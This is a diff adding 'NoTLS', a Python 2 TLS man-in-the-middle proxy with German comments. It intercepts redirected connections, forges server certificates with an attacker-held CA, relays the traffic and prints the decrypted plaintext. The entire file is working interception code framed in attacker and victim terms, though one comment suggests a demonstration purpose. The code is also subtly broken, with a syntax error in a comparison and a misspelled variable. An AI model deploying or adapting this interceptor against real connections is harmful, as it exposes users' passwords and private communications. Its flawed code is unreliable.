@@ -1,0 +1,302 @@
+#!/usr/bin/python
+# NoTLS from Robert de Meyer
+# based on Phil Mayers txsslmitm: https://github.com/philmayers/txsslmitm
+
+import tempfile
+import sys
+import os
+import struct
+import hashlib
+import socket
+socket.SO_ORIGINAL_DST = 80
+import ssl as pyssl
+
+from twisted.internet import ssl, reactor, protocol, defer, utils, threads
+from twisted.python import log
+from twisted.protocols import tls
+
+# Diese Methode ist dafuer verantwortlich, aus einem echten Certifikat
+# ein neues gefaelschtes Zertifikat zu erstellen. Dabei wird die 
+# eigene CA verwendet, welche ihren privaten und oeffentlichen Schluessel
+# in den Files "ca.crt" und "ca.key" speichert
+@defer.inlineCallbacks
+def certMaker(cert):
+    #if cert['subject'][-1][0][0]!='commonName':
+    #    raise Exception('Konnte das Feld \'commonName\' nicht finden')
+    #Hier werden einige Zertifikatsdaten aus dem orinalen Zertifikat
+    #zwischengespeichert
+    hostname, countryname, state, locality, organizasion, unit = "","","","","",""
+    #hostname = cert['subject'][-1][0][1]   #unnötig durch meinen parsevorgang
+    print 'Parse Serverzertifikat'
+    for key in cert['subject']:
+	if (key[0][0] ==  'commonName'):
+	    hostname = key[0][1]
+	elif (key[0][0] == 'countryName'):
+	    countryname = key[0][1]
+	elif (key[0][0] == 'stateOrProvinceName'):
+	    state = key[0][1]
+	elif (key[0][0] == 'localityName'):
+            locality = key[0][1]
+	elif (key[0][0] == 'organizationName'):
+  	    organization = key[0][1]
+	elif (key[0][0] == 'organizationalUnitName'):
+	    unit = key[0][1]
+	else:
+	    print 'Feld %s wird derzeit von NoTLS nicht erfasst' % key[0][0]
+    print 'commonName = %s\n countryName = %s\n state = %s\n locality = %s\n organization = %s\nUnit = %s' % (hostname, countryname, state, locality, organization, unit)
+    if hostname = "":
+	raise Exception('Konnte das Feld \'commonName\' nicht finden')
+
+    originalhash = cert['hash']
+
+    keyfile = '%s-key.pem' % originalhash
+    csrfile = '%s-csr.pem' % originalhash
+    certfile = '%s-crt.pem' % originalhash
+
+    try:
+        # hier wird anhand des Dateinamens (=SHA1 vom DER Codierten Zertifikat) überprüft, ob das Zertifikat bereits
+        # installiert ist
+        os.stat(certfile)
+    except:
+        print "Erstelle neues Zertifikat."
+    else:
+        print "Verwende gefälschtes Zertifikat von der Disk"
+        # Die funktion liefert die nötigen Informationen (hostname, Zertifikat mit oeffentlichen Schlessel,
+        # Privater Schluessel), welche zum Verbindungsaufbau mit dem Client benoetigt werden
+        r = {
+                'name': hostname,
+                'cert': certfile,
+                'key': keyfile,
+                }
+        defer.returnValue(r)
+
+
+    # Hier wird derzeit absichtlich nur der Hostname ins CommonName Feld 
+    # gespeichert, um die Tatsache, dass ein falsches Zertifikat verwendet wurde
+    # zu zeigen.
+    subj = '/CN=%s/OU=GefaelschteCA/O=Meine gefaelschte CA' % (
+            hostname,
+            )
+
+    # Hier wird über OpenSSL ein Signingrequest für das neue Zertifikat erstellt (csr)
+    # Der Output generiert auch den Privaten Schlüssel für den CSR
+    res = yield utils.getProcessOutputAndValue('/usr/bin/openssl',
+        ('req','-newkey','rsa:1024','-nodes','-subj',subj,'-keyout',keyfile,'-out',csrfile),
+        )
+    out, err, code = res
+    if code!=0:
+        raise Exception('Fehler beim erstellen des CSR File: '+err)
+
+    # Da die Alternativen Serverdomains auch kopiert werden sollen (subjectAltName)
+    # wird das orginale Serverzertifikat geparst und die Namen in ein temporaeres File
+    # geschrieben, welches beim ausstellen des Zertifikates für die extensions benutzt wird.
+    fd, tmpname = tempfile.mkstemp()
+    try: 
+        ext = os.fdopen(fd, 'w')
+
+        # write the subjectAltName extension into a temp .cnf file
+        dns = []
+        if 'subjectAltName' in cert:
+            for san in cert['subjectAltName']:
+                if san[0]!='DNS':
+                    continue
+                dns.append('DNS:'+san[1])
+        if dns:
+            # Hier werden alle Alternativen Serverdomains in das temporaere File geschrieben
+            print >>ext, "subjectAltName=" + ','.join(dns)
+        ext.close()
+
+        # Hier wird über die lokale CA vom Angreifer das Zertifikat erstellt.
+        # Derzeit wird die Serialnummer vom orginalen Serverzertifikat noch nicht übernommen. Weiteres 
+	# wird nur die subjectAltName extension kopiert
+        res = yield utils.getProcessOutputAndValue('/usr/bin/openssl',
+            ('x509','-req','-days','365','-in',csrfile,'-CA','ca.crt','-CAkey','ca.key','-CAcreateserial','-CAserial','test.seq','-extfile',tmpname,'-out',certfile),
+            )
+    finally:
+        # Nachdem das gefaelschte Zertifikat erstellt wurde, kann das Temporaere File gelöscht werden.
+        os.unlink(tmpname)
+
+    # Wenn das Zertifikat erfolgreich erstellt wurde, kann es für den Clientverbindungsaufbau uebergeben werden
+    out, err, code = res
+    if code==0:
+        r = {
+                'name': hostname,
+                'cert': certfile,
+                'key': keyfile,
+                }
+        defer.returnValue(r)
+
+    raise Exception('Konnte das Zertifikat nicht erstellen: '+err)
+
+# Da ich mit der Twisted API Probleme hatte, 
+# wird ein ein Socker über die ssl Library von Python erstellen
+# Diese Methode verbindet sich über den deferThread ssl_cert_chain
+# und bildet den Hashwert des binary Zertifikates (DER Codiert)
+# um doppelte Zertifikatserstellung zu vermeiden.
+def _ssl_cert_chain(host, port):
+
+    # TODO: Getaddrinfo sollte hier verwendet werden (ipv6 sicher)
+    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # Timeout für SSL Verbindung zum Server
+    soc.settimeout(10)
+    soc.connect((host, port))
+
+    sec = pyssl.wrap_socket(
+            soc,
+            # Da die ssl Engine ein Problem mit Selbstsignierten
+	    # Zertifikaten hatte (Die Funktion getpeercert lieferte
+	    # in diesem Fall kein Zertifikat!), funktioniert der Code
+	    # nur mit einer Zertifikatsprüfung 
+	    # OBACHT: Der Pfad für die CA varriert bei unterschiedlichen 
+	    # Betriebssystemen.
+            cert_reqs=pyssl.CERT_REQUIRED,
+            ca_certs='/etc/ssl/certs/ca-certificates.crt',
+            )
+    # Sollte Redundant sein
+    sec.do_handshake()
+
+    # Hier wird nun das Serverzertifikat in rv gespeichert und der Hashwert im zurueckgelieferten Dictionary
+    # abgespeichert.
+    rv = sec.getpeercert()
+    bin = sec.getpeercert(binary_form=True)
+    rv['hash'] = hashlib.sha1(bin).hexdigest()
+
+    sec.close()
+    del sec
+    del soc
+    return rv
+# Diese Methode ruft einen Deferred Thread auf, welche das SSL Zertifikat vom echten Server besorgt.
+def ssl_cert_chain(host, port):
+    return threads.deferToThread(_ssl_cert_chain, host, port)
+
+# Diese Klasse speichert anhand der des Tupels ip/port die bereits aufgerufenen Zertifikatschecks
+# Dadurch wird die Performance von NoTLS verbessert, da bestehende bereits im laufenden Programm
+# aufgerufene Zertifikate nicht nochmals generiert bzw. überprueft werden.
+class CertCache:
+    def __init__(self):
+        self._cache = {}
+    # Falls bereits ein gefälschtes Serverzertifikat vom Cache erfasst wurde, wird dieses sofort zurück
+    # gegeben. Andernfalls wird zuerst das Zertifikat vom Server geholt [ssl_cert_chain] und durch den
+    # certMaker ggf. neu generiert.
+    # Um unnötige Blockierungen vom Programm zu vermeiden, wird die Methode in einem Callback defer gestartet.
+    @defer.inlineCallbacks
+    def checkSSL(self, host, port):
+
+        if (host, port) in self._cache:
+            defer.returnValue(self._cache[host, port])
+
+        cert = yield ssl_cert_chain(host, port)
+        fake = yield certMaker(cert)
+        self._cache[host, port] = fake
+        defer.returnValue(fake)
+
+cache = CertCache()
+
+class Forwarder(protocol.Protocol):
+    other = None
+    # Diese Methode wird von Twisted aufgerufen, sobald die Verbindung vom Client zum Angreifer bzw. vom Server zum Angreifer aufgeloest wurde.
+    # Es wird ausserdem dafür gesorgt, dass beide Enden der Verbindung aufgeloest werden.
+    def connectionLost(self, reason):
+        if self.other is None:
+            pass
+        else:
+            self.other.transport.loseConnection()
+            self.other = None
+
+    # Diese Methode wird von Twisted aufgerufen, sobald Daten vom Opfer oder vom Server empfangen wurden.
+    # Durch die Funktion getPeer() wird die Herkunft (Socket) der empfangenen Daten bestimmt.
+    # Anschließend werden die Daten an das Opfer bzw. den Server weitergeleitet
+    def dataReceived(self, data):
+	print str(len(data))+" Bytes wurden empfangen (Absender: %s)"%self.transport.getPeer()
+	#print self.__class__.__name__
+	print data
+        self.other.transport.write(data)
+
+class ForwardOut(Forwarder):
+    def connectionMade(self):
+        self.other.other = self
+
+        # Dieser Code stammt von dem t.p.portforward Beispiel der Twisted Dokumentation
+        # und installiert die Konsumenten für das ForwarderProtokoll.
+        self.transport.registerProducer(self.other.transport, True)
+        self.other.transport.registerProducer(self.transport, True)
+
+        # Hier wird die SSL Verbindung vom Client zum Angreifer fortgesetzt
+        self.other._resume()
+
+class ForwardFactory(protocol.ClientFactory):
+    noisy = False
+
+    def buildProtocol(self, addr):
+        prot = ForwardOut()
+        prot.other = self.other
+        return prot
+
+    def clientConnectionFailed(self, reason):
+        self.other.transport.loseConnection()
+
+class MitmProtocol(Forwarder):
+
+    certinfo = None
+
+    def connectionMade(self):
+        # Da noch kein gefaelschtes Serverzertifikat verfuegbar ist, wird die Kommunikation zum
+        # Client unterbrochen
+        self.transport.pauseProducing()
+
+        # In diesem Teil wird die das Serversocket ermittelt
+        orig = self.transport.socket.getsockopt(socket.SOL_IP, socket.SO_ORIGINAL_DST, 16)
+        fam, port, addr, rest = struct.unpack('!HH4s8s', orig)
+        addr = socket.inet_ntoa(addr)
+
+        log.msg('Verbindung zu', addr, port, 'wurde unterbrochen')
+
+	# Hier wird die Methode checkSSL in einer Callbackfunktion gestartet, welche bei erfolgten ablauf
+        # die Klassenmethode _gotcert aufruft und das Serversocket uebergibt 
+        d = cache.checkSSL(addr, port).addCallback(self._gotcert, addr, port)
+   	# Falls checkSSL fehlschlaegt, wird jedoch die Methode _goterr aufgerufen
+        d.addErrback(self._goterr, addr, port)
+
+    def _goterr(self, fail, orighost, origport):
+        log.msg('Konnte kein SSL Zertifikat fuer Host ', orighost, origport, 'finden')
+        log.err(fail)
+        self.transport.loseConnection()
+
+    def _gotcert(self, result, orighost, origport):
+        self.certinfo = result
+
+        log.msg("Verbindindung zu Server wird hergestellt. ", orighost, origport)
+	f = ForwardFactory()
+        f.other = self
+	
+	# Hier wird die Verbindung vom Angreifer zum Server ueber Twisted aufgebaut.
+        ccf = ssl.ClientContextFactory()
+        reactor.connectSSL(orighost, origport, f, ccf)
+
+    def _resume(self):
+        # Wenn das gefaelschte serverzertifikat generiert wurde und in die Klassenvariable certinfo geschrieben wurde
+	# wird hier die Verbindung vom Angreifer zum Client aufgebaut.
+        self.transport.resumeProducing()
+
+        ctx = ssl.DefaultOpenSSLContextFactory(self.certinfo['key'], self.certinfo['cert'])
+        self.transport.startTLS(ctx)
+
+class MitmFactory(protocol.ServerFactory):
+    noisy = False
+
+    def logPrefix(self):
+        return '-'
+
+    def buildProtocol(self, addr):
+        return MitmProtocol()
+
+def main():
+    #log.startLogging(sys.stderr)
+
+    factory = MitmFactory()
+    reactor.listenTCP(4443, factory)
+    reactor.run()
+
+if __name__=='__main__':
+    main()
